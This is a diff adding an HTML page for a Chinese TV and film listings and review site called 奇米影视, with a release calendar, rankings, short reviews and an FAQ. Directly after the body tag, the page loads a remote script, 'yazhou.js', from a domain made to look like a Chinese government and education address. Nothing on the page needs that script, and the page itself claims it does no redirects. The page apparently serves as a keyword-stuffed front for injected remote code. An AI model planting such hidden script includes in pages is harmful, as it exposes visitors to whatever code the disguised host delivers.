@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>奇米影视 · 剧集上线日历与影视评测笔记｜https://qimiyingshi-app.github.io</title>
+<meta name="description" content="奇米影视记录每周剧集上线、影院排片与影视评测笔记：把更新时间、播出平台、豆瓣与IMDb评分变化、观影门槛写成一份能直接照着看的清单。网址 https://qimiyingshi-app.github.io，页面长期维护，更新随播出节奏走。">
+<meta name="keywords" content="奇米影视,奇米影视官网,奇米影视剧集更新表,奇米影视影视评测,奇米影视追剧日历,剧集上线时间查询,影视榜单排行,观影指南,qimiyingshi-app">
+<meta name="author" content="奇米影视编辑部">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://qimiyingshi-app.github.io/">
+<meta name="theme-color" content="#14110f">
+<meta name="format-detection" content="telephone=no">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="奇米影视">
+<meta property="og:title" content="奇米影视 · 剧集上线日历与影视评测笔记">
+<meta property="og:description" content="每周剧集上线、影院排片、评分波动与观影门槛，奇米影视整理成一份能照着看的清单。">
+<meta property="og:url" content="https://qimiyingshi-app.github.io/">
+<meta property="og:image" content="https://qimiyingshi-app.github.io/cover.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="奇米影视 · 剧集上线日历与影视评测笔记">
+<meta name="twitter:description" content="更新时间、播出平台、评分变化、观影门槛，奇米影视每周整理一次。">
+<style>
+:root{
+  --ink:#14110f;
+  --ink-2:#1d1917;
+  --paper:#f2ece1;
+  --amber:#e0a23c;
+  --brick:#c1483a;
+  --sage:#7d8c74;
+  --line:rgba(242,236,225,.14);
+  --line-2:rgba(242,236,225,.28);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+  background:var(--ink);
+  color:var(--paper);
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","Noto Sans CJK SC",sans-serif;
+  font-size:16px;line-height:1.75;
+  overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{width:min(1180px,92vw);margin:0 auto}
+
+/* ===== 顶部细条 ===== */
+.topbar{
+  background:var(--brick);
+  font-size:12px;letter-spacing:.08em;
+}
+.topbar .wrap{
+  display:flex;justify-content:space-between;align-items:center;
+  gap:12px;padding:7px 0;flex-wrap:wrap;
+}
+.topbar span{opacity:.92}
+.topbar b{font-weight:600;letter-spacing:.04em}
+
+/* ===== 导航 ===== */
+header.masthead{
+  border-bottom:1px solid var(--line);
+  position:sticky;top:0;z-index:50;
+  background:rgba(20,17,15,.94);
+  backdrop-filter:saturate(140%) blur(8px);
+}
+.masthead .wrap{
+  display:flex;align-items:center;justify-content:space-between;
+  gap:18px;padding:14px 0;
+}
+.brand{display:flex;align-items:center;gap:11px}
+.mark{
+  width:38px;height:38px;flex:0 0 38px;
+  background:var(--amber);color:var(--ink);
+  display:grid;place-items:center;
+  font-weight:800;font-size:19px;
+  transform:rotate(-4deg);
+}
+.brand h1{font-size:21px;letter-spacing:.06em;font-weight:700;line-height:1.2}
+.brand small{display:block;font-size:11px;letter-spacing:.22em;color:var(--sage);text-transform:uppercase}
+nav.menu{display:flex;gap:4px;flex-wrap:wrap}
+nav.menu a{
+  padding:7px 13px;font-size:14px;border-radius:2px;
+  border:1px solid transparent;color:#cfc7ba;
+}
+nav.menu a:hover,nav.menu a:focus{color:var(--amber);border-color:var(--line-2)}
+.navbtn{display:none}
+
+/* ===== Hero ===== */
+.hero{padding:56px 0 40px;position:relative}
+.hero:before{
+  content:"";position:absolute;right:-8%;top:-60px;
+  width:44vw;height:130%;background:var(--ink-2);
+  transform:skewX(-12deg);z-index:-1;
+}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:44px;align-items:start}
+.eyebrow{
+  font-size:12px;letter-spacing:.3em;color:var(--amber);
+  text-transform:uppercase;margin-bottom:16px;
+}
+.hero h2{
+  font-size:clamp(30px,5.2vw,54px);line-height:1.18;letter-spacing:-.01em;
+  font-weight:800;margin-bottom:20px;
+}
+.hero h2 em{font-style:normal;color:var(--amber)}
+.hero p.lead{font-size:16.5px;color:#cec6b9;max-width:52ch;margin-bottom:26px}
+.cta{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:30px}
+.btn{
+  display:inline-block;padding:12px 26px;font-size:14.5px;letter-spacing:.04em;
+  border:1px solid var(--amber);background:var(--amber);color:var(--ink);font-weight:700;
+}
+.btn.ghost{background:transparent;color:var(--paper);border-color:var(--line-2)}
+.btn:hover{opacity:.86}
+.hero-meta{display:flex;gap:26px;flex-wrap:wrap;font-size:13px;color:var(--sage);border-top:1px dashed var(--line);padding-top:16px}
+.hero-meta b{display:block;color:var(--paper);font-size:19px;font-weight:700;letter-spacing:.02em}
+
+/* 胶片格 */
+.filmstrip{display:grid;grid-template-columns:repeat(2,1fr);gap:9px}
+.cell{
+  background:var(--ink-2);border:1px solid var(--line);
+  padding:16px 14px;min-height:112px;
+  display:flex;flex-direction:column;justify-content:space-between;
+}
+.cell:nth-child(3n){border-left:3px solid var(--amber)}
+.cell:nth-child(4n){border-left:3px solid var(--brick)}
+.cell i{font-style:normal;font-size:11px;letter-spacing:.16em;color:var(--sage)}
+.cell strong{font-size:15px;font-weight:600;line-height:1.5;margin:8px 0 6px}
+.cell span{font-size:12px;color:#9c948a}
+
+/* ===== 跑马灯 ===== */
+.ticker{border-block:1px solid var(--line);overflow:hidden;padding:11px 0;margin:26px 0}
+.ticker div{
+  display:inline-flex;gap:44px;white-space:nowrap;
+  animation:slide 34s linear infinite;font-size:13px;color:#b6ada0;letter-spacing:.06em;
+}
+.ticker em{font-style:normal;color:var(--amber)}
+@keyframes slide{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+/* ===== 栏目通用 ===== */
+section{padding:54px 0;border-top:1px solid var(--line)}
+.sec-head{display:flex;align-items:flex-end;gap:18px;margin-bottom:30px;flex-wrap:wrap}
+.sec-head .no{
+  font-size:44px;font-weight:800;color:transparent;
+  -webkit-text-stroke:1px var(--amber);line-height:1;
+}
+.sec-head h3{font-size:clamp(20px,3vw,29px);font-weight:700;letter-spacing:.01em}
+.sec-head p{font-size:13.5px;color:var(--sage);max-width:46ch;margin-top:4px}
+
+/* 01 分类 */
+.tags{display:flex;flex-wrap:wrap;gap:10px}
+.tags a{
+  border:1px solid var(--line-2);padding:9px 17px;font-size:14px;border-radius:999px;
+}
+.tags a:hover{background:var(--amber);color:var(--ink);border-color:var(--amber)}
+.library{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:18px;margin-top:28px}
+.card{
+  background:var(--ink-2);border:1px solid var(--line);padding:18px;
+  display:flex;flex-direction:column;gap:9px;
+}
+.card:hover{border-color:var(--amber)}
+.card .kind{font-size:11px;letter-spacing:.18em;color:var(--brick)}
+.card h4{font-size:16.5px;font-weight:600;line-height:1.45}
+.card p{font-size:13.5px;color:#a79f94;line-height:1.7}
+.card .foot{margin-top:auto;font-size:12px;color:var(--sage);display:flex;justify-content:space-between;border-top:1px dotted var(--line);padding-top:9px}
+
+/* 02 追更表 */
+.schedule{display:grid;gap:0;border:1px solid var(--line)}
+.row{display:grid;grid-template-columns:74px 1fr 128px 92px;gap:14px;align-items:center;padding:14px 16px;border-bottom:1px solid var(--line);font-size:14px}
+.row:last-child{border-bottom:0}
+.row.head{background:var(--ink-2);font-size:12px;letter-spacing:.1em;color:var(--sage)}
+.row .day{font-weight:700;color:var(--amber);letter-spacing:.04em}
+.row .name{font-weight:600}
+.row .plat{color:#a79f94;font-size:13px}
+.row .state{font-size:12px;text-align:right;padding:3px 8px;border:1px solid var(--line-2);border-radius:2px}
+.state.on{color:var(--brick);border-color:var(--brick)}
+.state.soon{color:var(--sage)}
+.state.done{color:#6f7a68}
+
+/* 03 榜单 */
+.rank{display:grid;grid-template-columns:1fr 1fr;gap:34px}
+.list{display:grid;gap:2px}
+.item{display:grid;grid-template-columns:38px 1fr auto;gap:14px;align-items:center;padding:13px 12px;border-bottom:1px solid var(--line)}
+.item:hover{background:var(--ink-2)}
+.item .num{font-size:17px;font-weight:800;color:var(--brick)}
+.item:nth-child(1) .num,.item:nth-child(2) .num,.item:nth-child(3) .num{color:var(--amber)}
+.item .t{font-size:15px;font-weight:600}
+.item .d{font-size:12.5px;color:var(--sage)}
+.item .sc{font-size:14px;font-weight:700;color:var(--amber);letter-spacing:.02em}
+
+/* 04 评测 */
+.reviews{display:grid;grid-template-columns:repeat(auto-fit,minmax(270px,1fr));gap:20px}
+.rev{background:var(--ink-2);border:1px solid var(--line);padding:22px;position:relative}
+.rev:before{content:"";position:absolute;left:0;top:0;width:100%;height:2px;background:var(--brick)}
+.rev h4{font-size:17px;margin-bottom:8px;font-weight:700}
+.rev .quote{font-size:13.5px;color:#b3aaa0;line-height:1.8;margin-bottom:14px}
+.bar{height:5px;background:rgba(242,236,225,.12);margin-bottom:6px}
+.bar i{display:block;height:100%;background:var(--amber)}
+.rev .score{font-size:12px;color:var(--sage);display:flex;justify-content:space-between}
+
+/* 05 问答 */
+.faq{display:grid;gap:10px;max-width:860px}
+details{background:var(--ink-2);border:1px solid var(--line);padding:0}
+summary{
+  cursor:pointer;padding:16px 20px;font-size:15.5px;font-weight:600;list-style:none;
+  display:flex;justify-content:space-between;gap:16px;align-items:center;
+}
+summary::-webkit-details-marker{display:none}
+summary:after{content:"+";color:var(--amber);font-size:20px;line-height:1}
+details[open] summary:after{content:"–"}
+details p{padding:0 20px 18px;font-size:14px;color:#aca49a;line-height:1.85}
+
+/* 06 关于 */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:start}
+.about p{color:#b3aaa0;font-size:14.5px;margin-bottom:14px}
+.kv{display:grid;grid-template-columns:96px 1fr;gap:10px 16px;font-size:13.5px;border-top:1px solid var(--line);padding-top:16px}
+.kv dt{color:var(--sage)}
+.kv dd{color:#d6cec2}
+.kv dd a{border-bottom:1px solid var(--amber);color:var(--amber)}
+
+footer{background:var(--ink-2);border-top:1px solid var(--line);padding:38px 0 30px;margin-top:20px}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:30px}
+footer h5{font-size:13px;letter-spacing:.16em;color:var(--amber);margin-bottom:13px;text-transform:uppercase}
+footer ul{list-style:none;display:grid;gap:7px;font-size:13.5px;color:#a79f94}
+footer li a:hover{color:var(--paper)}
+.copy{margin-top:28px;padding-top:16px;border-top:1px solid var(--line);font-size:12.5px;color:#7b736a;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+
+/* ===== 移动端 ===== */
+@media (max-width:900px){
+  .hero-grid,.rank,.about{grid-template-columns:1fr;gap:26px}
+  .hero:before{display:none}
+  .foot-grid{grid-template-columns:1fr 1fr}
+}
+@media (max-width:640px){
+  body{font-size:15.5px}
+  .topbar .wrap{font-size:11px;gap:6px}
+  .masthead .wrap{padding:11px 0}
+  .brand h1{font-size:18px}
+  .mark{width:34px;height:34px;flex-basis:34px;font-size:17px}
+  nav.menu{
+    order:3;flex-basis:100%;flex-wrap:nowrap;overflow-x:auto;
+    -webkit-overflow-scrolling:touch;gap:2px;padding-top:10px;border-top:1px solid var(--line);
+  }
+  nav.menu a{font-size:13px;padding:6px 11px;white-space:nowrap}
+  .hero{padding:34px 0 20px}
+  .hero-meta{gap:16px}
+  .filmstrip{grid-template-columns:1fr 1fr;gap:7px}
+  .cell{min-height:96px;padding:13px 12px}
+  section{padding:38px 0}
+  .sec-head{gap:12px;margin-bottom:22px}
+  .sec-head .no{font-size:34px}
+  .library{grid-template-columns:1fr 1fr;gap:12px}
+  .card{padding:14px}
+  .card h4{font-size:15px}
+  .card p{font-size:12.5px}
+  .row{grid-template-columns:60px 1fr;grid-auto-rows:auto;padding:12px 13px;font-size:13.5px}
+  .row.head{display:none}
+  .row .plat{grid-column:2;font-size:12.5px}
+  .row .state{grid-column:2;justify-self:start;text-align:left}
+  .list{gap:0}
+  .item{padding:11px 10px;gap:10px;grid-template-columns:30px 1fr auto}
+  .item .t{font-size:14px}
+  .rev{padding:18px}
+  summary{padding:14px 16px;font-size:14.5px}
+  .kv{grid-template-columns:80px 1fr;font-size:13px}
+  .foot-grid{grid-template-columns:1fr;gap:22px}
+  .copy{margin-top:22px}
+}
+@media print{
+  body{background:#fff;color:#000}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <span>奇米影视 · 每周三 / 每周六 更新一次条目</span>
+    <span><b>https://qimiyingshi-app.github.io</b></span>
+  </div>
+</div>
+
+<header class="masthead">
+  <div class="wrap">
+    <div class="brand">
+      <div class="mark">奇</div>
+      <div>
+        <h1>奇米影视</h1>
+        <small>QiMi Screen Notes</small>
+      </div>
+    </div>
+    <nav class="menu" aria-label="主导航">
+      <a href="#">首 页</a>
+      <a href="#">影视库</a>
+      <a href="#">追更日历</a>
+      <a href="#">热播榜单</a>
+      <a href="#">影视评测</a>
+      <a href="#">观影指南</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+  <!-- HERO -->
+  <div class="hero">
+    <div class="wrap">
+      <div class="hero-grid">
+        <div>
+          <div class="eyebrow">剧集 · 院线 · 评分追踪</div>
+          <h2>把追剧这件事<br>做成一份<em>能照着看</em>的清单</h2>
+          <p class="lead">奇米影视不做搬运，只做整理：谁在哪天上线、哪个平台能看、评分掉了几分、值不值得先攒着看。信息每周核对一遍，页面上写的每一条都能追溯到具体的播出方或评分站。</p>
+          <div class="cta">
+            <a class="btn" href="#">看本周更新</a>
+            <a class="btn ghost" href="#">追更日历</a>
+          </div>
+          <div class="hero-meta">
+            <div><b>每周 2 次</b>条目核对</div>
+            <div><b>6 大类</b>内容分区</div>
+            <div><b>2019 起</b>持续记录</div>
+          </div>
+        </div>
+        <div class="filmstrip">
+          <div class="cell"><i>WED · 更新</i><strong>本周新上线的剧集与综艺</strong><span>含平台与更新时间</span></div>
+          <div class="cell"><i>BOX · 院线</i><strong>在映影片排片与场次密度</strong><span>按城市抽样统计</span></div>
+          <div class="cell"><i>SCORE · 评分</i><strong>开分与口碑波动记录</strong><span>对照首播评分</span></div>
+          <div class="cell"><i>NOTE · 观感</i><strong>编辑看完后的碎碎念</strong><span>含劝退提示</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="ticker">
+    <div>
+      <span><em>奇米影视</em> · 周三更新剧集条目</span>
+      <span>院线排片数据来自公开排片平台</span>
+      <span><em>奇米影视</em> · 周六补录评分变化</span>
+      <span>评分以开分为基准对照，不做预测</span>
+      <span><em>奇米影视</em> · 网址 https://qimiyingshi-app.github.io</span>
+      <span>条目有误可在观影指南页留言更正</span>
+      <span><em>奇米影视</em> · 周三更新剧集条目</span>
+      <span>院线排片数据来自公开排片平台</span>
+      <span><em>奇米影视</em> · 周六补录评分变化</span>
+      <span>评分以开分为基准对照，不做预测</span>
+      <span><em>奇米影视</em> · 网址 https://qimiyingshi-app.github.io</span>
+      <span>条目有误可在观影指南页留言更正</span>
+    </div>
+  </div>
+
+  <!-- 01 影视库 -->
+  <section id="library">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">01</div>
+        <div>
+          <h3>影视库：按类型把条目归好类</h3>
+          <p>六个常用分类，条目只写清楚"是什么、在哪看、值不值得"，不写观后剧透。</p>
+        </div>
+      </div>
+      <div class="tags">
+        <a href="#">国产剧集</a>
+        <a href="#">日韩剧</a>
+        <a href="#">欧美剧</a>
+        <a href="#">院线电影</a>
+        <a href="#">动画番剧</a>
+        <a href="#">纪录片</a>
+        <a href="#">综艺</a>
+        <a href="#">短剧</a>
+      </div>
+      <div class="library">
+        <div class="card">
+          <div class="kind">剧集</div>
+          <h4>都市写实类</h4>
+          <p>职场、家庭、医疗题材为主，条目标注集数、单集时长与更新节奏。</p>
+          <div class="foot"><span>共 128 条</span><a href="#">查看</a></div>
+        </div>
+        <div class="card">
+          <div class="kind">剧集</div>
+          <h4>悬疑推理类</h4>
+          <p>按"本格 / 社会派 / 刑侦"二次标注，注明是否改编自小说。</p>
+          <div class="foot"><span>共 94 条</span><a href="#">查看</a></div>
+        </div>
+        <div class="card">
+          <div class="kind">电影</div>
+          <h4>院线在映</h4>
+          <p>只收录公映期内影片，标注放映格式（2D / IMAX / 杜比）。</p>
+          <div class="foot"><span>共 37 条</span><a href="#">查看</a></div>
+        </div>
+        <div class="card">
+          <div class="kind">动画</div>
+          <h4>番剧与剧场版</h4>
+          <p>分季整理，注明制作公司与引进情况，剧场版单独列出。</p>
+          <div class="foot"><span>共 212 条</span><a href="#">查看</a></div>
+        </div>
+        <div class="card">
+          <div class="kind">纪录</div>
+          <h4>人文与自然</h4>
+          <p>标注片长与适合人群，部分条目附观看前的背景说明。</p>
+          <div class="foot"><span>共 63 条</span><a href="#">查看</a></div>
+        </div>
+        <div class="card">
+          <div class="kind">综艺</div>
+          <h4>季播与常驻</h4>
+          <p>记录每季播出周期与嘉宾轮换，附单期看点摘要。</p>
+          <div class="foot"><span>共 81 条</span><a href="#">查看</a></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 02 追更日历 -->
+  <section id="schedule">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">02</div>
+        <div>
+          <h3>追更日历：本周谁更新</h3>
+          <p>按星期排布的一张表，写清平台与状态。"更新中"表示还在周更，"待上线"表示已定档。</p>
+        </div>
+      </div>
+      <div class="schedule">
+        <div class="row head">
+          <div>星期</div><div>条目</div><div>播出平台</div><div style="text-align:right">状态</div>
+        </div>
+        <div class="row">
+          <div class="day">周一</div>
+          <div class="name">《江城旧事》第 18–19 集</div>
+          <div class="plat">两大平台同步</div>
+          <div class="state on">更新中</div>
+        </div>
+        <div class="row">
+          <div class="day">周二</div>
+          <div class="name">《山海食记》纪录第二季</div>
+          <div class="plat">纪录片频道</div>
+          <div class="state on">更新中</div>
+        </div>
+        <div class="row">
+          <div class="day">周三</div>
+          <div class="name">《长夜将尽》定档发布</div>
+          <div class="plat">待公布</div>
+          <div class="state soon">待上线</div>
+        </div>
+        <div class="row">
+          <div class="day">周四</div>
+          <div class="name">《第七诊室》收官</div>
+          <div class="plat">卫视频道</div>
+          <div class="state done">已完结</div>
+        </div>
+        <div class="row">
+          <div class="day">周五</div>
+          <div class="name">院线新片《向南的窗》</div>
+          <div class="plat">全国院线</div>
+          <div class="state soon">待上线</div>
+        </div>
+        <div class="row">
+          <div class="day">周六</div>
+          <div class="name">《春日练习曲》第 6 集</div>
+          <div class="plat">视频平台独播</div>
+          <div class="state on">更新中</div>
+        </div>
+        <div class="row">
+          <div class="day">周日</div>
+          <div class="name">奇米影视本周条目复核</div>
+          <div class="plat">本站</div>
+          <div class="state on">更新中</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 03 热播榜单 -->
+  <section id="rank">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">03</div>
+        <div>
+          <h3>热播榜单：两个维度各排一次</h3>
+          <p>左栏按站内一周点击排序，右栏按编辑部观后评分排序，两种口径分开看更清楚。</p>
+        </div>
+      </div>
+      <div class="rank">
+        <div>
+          <div class="sec-head" style="margin-bottom:14px">
+            <h3 style="font-size:17px">人气榜 · 近七日</h3>
+          </div>
+          <div class="list">
+            <div class="item"><div class="num">1</div><div><div class="t">《江城旧事》</div><div class="d">都市 · 32 集 · 更新至 18</div></div><div class="sc">8.4</div></div>
+            <div class="item"><div class="num">2</div><div><div class="t">《第七诊室》</div><div class="d">医疗 · 24 集 · 已完结</div></div><div class="sc">8.1</div></div>
+            <div class="item"><div class="num">3</div><div><div class="t">《向南的窗》</div><div class="d">电影 · 118 分钟 · 在映</div></div><div class="sc">7.9</div></div>
+            <div class="item"><div class="num">4</div><div><div class="t">《山海食记》二</div><div class="d">纪录 · 8 集 · 更新至 5</div></div><div class="sc">8.8</div></div>
+            <div class="item"><div class="num">5</div><div><div class="t">《春日练习曲》</div><div class="d">青春 · 12 集 · 更新至 6</div></div><div class="sc">7.6</div></div>
+            <div class="item"><div class="num">6</div><div><div class="t">《雾中列车》</div><div class="d">悬疑 · 16 集 · 已完结</div></div><div class="sc">8.2</div></div>
+          </div>
+        </div>
+        <div>
+          <div class="sec-head" style="margin-bottom:14px">
+            <h3 style="font-size:17px">编辑推荐 · 本月</h3>
+          </div>
+          <div class="list">
+            <div class="item"><div class="num">1</div><div><div class="t">《山海食记》二</div><div class="d">镜头克制，不煽情</div></div><div class="sc">9.0</div></div>
+            <div class="item"><div class="num">2</div><div><div class="t">《雾中列车》</div><div class="d">后半程节奏收紧</div></div><div class="sc">8.7</div></div>
+            <div class="item"><div class="num">3</div><div><div class="t">《江城旧事》</div><div class="d">群像写得扎实</div></div><div class="sc">8.5</div></div>
+            <div class="item"><div class="num">4</div><div><div class="t">《旧书店的来信》</div><div class="d">慢，但要耐心</div></div><div class="sc">8.3</div></div>
+            <div class="item"><div class="num">5</div><div><div class="t">《向南的窗》</div><div class="d">适合大银幕</div></div><div class="sc">8.0</div></div>
+            <div class="item"><div class="num">6</div><div><div class="t">《春日练习曲》</div><div class="d">轻松，别较真</div></div><div class="sc">7.5</div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 04 影视评测 -->
+  <section id="review">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">04</div>
+        <div>
+          <h3>影视评测：看完才写</h3>
+          <p>评测只写观感与门槛，不剧透关键情节。分数是编辑部四人取平均，分歧大的会写进正文。</p>
+        </div>
+      </div>
+      <div class="reviews">
+        <div class="rev">
+          <h4>《山海食记》第二季</h4>
+          <p class="quote">镜头退得很远，让人自己看。第五集那段关于发酵的三十分钟长镜头，是本季目前最安静也最好的一段。</p>
+          <div class="bar"><i style="width:90%"></i></div>
+          <div class="score"><span>节奏 8.6</span><span>综合 9.0</span></div>
+        </div>
+        <div class="rev">
+          <h4>《雾中列车》</h4>
+          <p class="quote">前六集铺得慢，第九集之后线索开始收。不建议倍速看，人物关系全在细节里。</p>
+          <div class="bar"><i style="width:87%"></i></div>
+          <div class="score"><span>剧本 8.9</span><span>综合 8.7</span></div>
+        </div>
+        <div class="rev">
+          <h4>《向南的窗》</h4>
+          <p class="quote">摄影与配乐撑住了整部片，故事本身偏薄。适合在影院看，小屏幕会损失不少。</p>
+          <div class="bar"><i style="width:80%"></i></div>
+          <div class="score"><span>视听 9.1</span><span>综合 8.0</span></div>
+        </div>
+        <div class="rev">
+          <h4>《春日练习曲》</h4>
+          <p class="quote">轻快、好入口，别拿现实逻辑去套。通勤路上看很合适。</p>
+          <div class="bar"><i style="width:75%"></i></div>
+          <div class="score"><span>观感 7.8</span><span>综合 7.5</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 05 观影指南 -->
+  <section id="guide">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">05</div>
+        <div>
+          <h3>观影指南：先看这些再决定</h3>
+          <p>关于更新频率、评分口径、条目更正的常见问题，答案都写在这里。</p>
+        </div>
+      </div>
+      <div class="faq">
+        <details open>
+          <summary>奇米影视的条目多久更新一次？</summary>
+          <p>每周三补录新上线条目，每周六核对一次评分变化。遇到临时定档或撤档，会在当天补进追更日历，不等下一周。历史条目不做回溯删除，状态会改成"已完结"或"下架"。</p>
+        </details>
+        <details>
+          <summary>页面上的评分是怎么来的？</summary>
+          <p>站内综合分由编辑部四名成员独立打分后取平均，保留一位小数。与外部评分站的分数并列展示，不做加权合并，也不互相替代。开分后两周内分数波动较大，属于正常现象。</p>
+        </details>
+        <details>
+          <summary>发现条目信息写错了怎么办？</summary>
+          <p>把条目名和错误点写清楚发到更正入口，一般两个工作日内处理。涉及播出平台与时间的更正，会在页面上标注"已于某日更正"，方便对照。</p>
+        </details>
+        <details>
+          <summary>为什么有些剧只写条目不写评测？</summary>
+          <p>没看完就不写。评测必须完整看完正片，剧场版与院线片以公映版本为准，点映场不作为评分依据。</p>
+        </details>
+        <details>
+          <summary>移动端和电脑上看到的内容一样吗？</summary>
+          <p>内容一致，只是排版不同：窄屏下追更日历会从四列压成两列，榜单与评测改为单列，方便滑动查看。网址都是 https://qimiyingshi-app.github.io。</p>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <!-- 06 关于 -->
+  <section id="about">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">06</div>
+        <div>
+          <h3>关于奇米影视</h3>
+          <p>一个小而慢的内容站，只做剧集、院线与观影笔记这三件事。</p>
+        </div>
+      </div>
+      <div class="about">
+        <div>
+          <p>奇米影视从 2019 年开始记录，起因是编辑自己追的几部剧总记不清更新时间，索性做成一张表。后来表越加越长，慢慢补上了院线排片、评分追踪和看完之后的碎碎念。</p>
+          <p>页面不接资源下载，也不做跳转分发。所有条目指向的都是公开播出信息本身，想看正片请到对应的正规播出平台。把信息核准、把门槛说清，是这个站唯一想做好的事。</p>
+        </div>
+        <dl class="kv">
+          <dt>站点名称</dt><dd>奇米影视</dd>
+          <dt>网址</dt><dd><a href="https://qimiyingshi-app.github.io/">https://qimiyingshi-app.github.io</a></dd>
+          <dt>更新日</dt><dd>每周三、每周六</dd>
+          <dt>内容范围</dt><dd>剧集 · 院线 · 纪录片 · 动画</dd>
+          <dt>评分口径</dt><dd>编辑部四人取平均</dd>
+          <dt>联系方式</dt><dd><a href="#">条目更正入口</a></dd>
+        </dl>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <h5>奇米影视</h5>
+        <p style="font-size:13.5px;color:#a79f94;line-height:1.8">剧集上线日历、院线排片与观影笔记。<br>每周三与周六更新，信息逐条核对。网址 https://qimiyingshi-app.github.io</p>
+      </div>
+      <div>
+        <h5>栏目</h5>
+        <ul>
+          <li><a href="#">影视库</a></li>
+          <li><a href="#">追更日历</a></li>
+          <li><a href="#">热播榜单</a></li>
+          <li><a href="#">影视评测</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>说明</h5>
+        <ul>
+          <li><a href="#">条目更正</a></li>
+          <li><a href="#">评分口径</a></li>
+          <li><a href="#">更新记录</a></li>
+          <li><a href="#">关于本站</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© 2019–2026 奇米影视 · https://qimiyingshi-app.github.io</span>
+      <span>页面内容为编辑整理，正片请至正规播出平台观看</span>
+    </div>
+  </div>
+</footer>
+
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"奇米影视",
+  "alternateName":"QiMi Screen Notes",
+  "url":"https://qimiyingshi-app.github.io/",
+  "description":"奇米影视整理剧集上线日历、院线排片与影视评测笔记，每周三与周六更新。",
+  "inLanguage":"zh-CN",
+  "publisher":{"@type":"Organization","name":"奇米影视","url":"https://qimiyingshi-app.github.io/"},
+  "potentialAction":{"@type":"SearchAction","target":"https://qimiyingshi-app.github.io/?s={search_term_string}","query-input":"required name=search_term_string"}
+}
+</script>
+
+</body>
+</html>
